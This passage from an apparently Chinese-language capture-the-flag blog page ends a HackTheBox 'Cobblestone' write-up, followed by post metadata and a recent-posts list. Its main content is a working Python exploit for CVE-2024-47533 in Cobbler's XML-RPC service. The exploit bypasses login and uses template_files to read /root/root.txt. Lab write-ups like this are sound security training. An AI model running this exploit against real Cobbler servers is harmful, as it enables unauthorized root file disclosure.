class=\"hljs-string\">\"/boot/vmlinuz-6.1.0-37-amd64\"</span>\nINITRD = <span class=\"hljs-string\">\"/boot/initrd.img-6.1.0-37-amd64\"</span>\nTARGET = <span class=\"hljs-string\">\"/root/root.txt\"</span>\nNAME   = <span class=\"hljs-string\">\"pwnsys\"</span>\nDEST   = <span class=\"hljs-string\">\"/leak\"</span>\n\n<span class=\"hljs-comment\"># 利用 CVE-2024-47533</span>\nsrv = xmlrpc.client.<span class=\"hljs-title function_ invoke__\">ServerProxy</span>(<span class=\"hljs-string\">\"http://127.0.0.1:25151/\"</span>, allow_none=True)\ntok = srv.<span class=\"hljs-title function_ invoke__\">login</span>(<span class=\"hljs-string\">\"\"</span>, -<span class=\"hljs-number\">1</span>)\n\n<span class=\"hljs-comment\"># 创建新实例</span>\n<span class=\"hljs-comment\"># 设置参数（随意）</span>\ndid = srv.<span class=\"hljs-title function_ invoke__\">new_distro</span>(tok)\nsrv.<span class=\"hljs-title function_ invoke__\">modify_distro</span>(did, <span class=\"hljs-string\">\"name\"</span>, <span class=\"hljs-string\">\"pwn_distro\"</span>, tok)\nsrv.<span class=\"hljs-title function_ invoke__\">modify_distro</span>(did, <span class=\"hljs-string\">\"kernel\"</span>, KERNEL, tok)\nsrv.<span class=\"hljs-title function_ invoke__\">modify_distro</span>(did, <span class=\"hljs-string\">\"initrd\"</span>, INITRD, tok)\nsrv.<span class=\"hljs-title function_ invoke__\">save_distro</span>(did, tok)\n\npid = srv.<span class=\"hljs-title function_ invoke__\">new_profile</span>(tok)\nsrv.<span class=\"hljs-title function_ invoke__\">modify_profile</span>(pid, <span class=\"hljs-string\">\"name\"</span>, <span class=\"hljs-string\">\"pwn_profile\"</span>, tok)\nsrv.<span class=\"hljs-title function_ invoke__\">modify_profile</span>(pid, <span class=\"hljs-string\">\"distro\"</span>, <span class=\"hljs-string\">\"pwn_distro\"</span>, tok)\nsrv.<span class=\"hljs-title function_ invoke__\">save_profile</span>(pid, tok)\n\nsid = srv.<span class=\"hljs-title function_ invoke__\">new_system</span>(tok)\nsrv.<span class=\"hljs-title function_ invoke__\">modify_system</span>(sid, <span class=\"hljs-string\">\"name\"</span>, NAME, tok)\nsrv.<span class=\"hljs-title function_ invoke__\">modify_system</span>(sid, <span class=\"hljs-string\">\"profile\"</span>, <span class=\"hljs-string\">\"pwn_profile\"</span>, tok)\nsrv.<span class=\"hljs-title function_ invoke__\">modify_system</span>(sid, <span class=\"hljs-string\">\"template_files\"</span>, {<span class=\"hljs-attr\">TARGET</span>: DEST}, tok)\nsrv.<span class=\"hljs-title function_ invoke__\">save_system</span>(sid, tok)\n<span class=\"hljs-keyword\">print</span>(srv.<span class=\"hljs-title function_ invoke__\">get_template_file_for_system</span>(<span class=\"hljs-string\">\"pwnsys\"</span>,<span class=\"hljs-string\">\"/leak\"</span>))\nsrv.<span class=\"hljs-title function_ invoke__\">sync</span>(tok)\n</code></pre>\n<p>最后利用的接口是：</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image13.png\" alt=\"image.png\"></p>","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","updated":"2025-08-11","tags":["HackTheBox","linux","RPC","SQLInjection","Cobbler","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Cobblestone\n\n https://app.hackthebox.com/machines/Cobblestone | `Linux` | `Insane`\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n枚举\n\n`80` 端口\n\n\n\n有三个功能，皮肤数据库，vote 投票，Deploy 服务器\n\n并且 皮肤数据库 和 投票的用户是分开的，两边都要重新注册\n\n然后这...","isEncrypted":true},"recentPosts":[{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","isEncrypted":true,"year":"2025","month":"08","day":"03"}]},"__N_SSG":true}